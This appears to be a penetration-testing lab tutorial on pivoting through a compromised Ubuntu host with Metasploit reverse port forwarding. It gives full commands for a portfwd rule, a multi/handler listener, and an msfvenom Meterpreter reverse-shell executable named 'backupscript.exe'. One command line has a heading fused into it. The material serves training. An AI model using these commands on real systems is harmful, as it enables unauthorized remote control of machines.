Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host.
This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
```
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18Configuring & Starting multi/handler
```
## Configuring & Starting multi/handler
```
bg
```
```
set payload windows/x64/meterpreter/reverse_tcp
```
```
set LHOST 0.0.0.0
```
```
set LPORT 8081
```
```
run
```
Create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.
1. Generating the Windows Payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```
2. Transfer to Ubuntu Pivot Host
3. Transfer from Ubuntu Pivot Host to Windows Host
4. Execute backupscript.exe payload
5. Shell pivoted via the Ubuntu Server
6. Meterpreter shell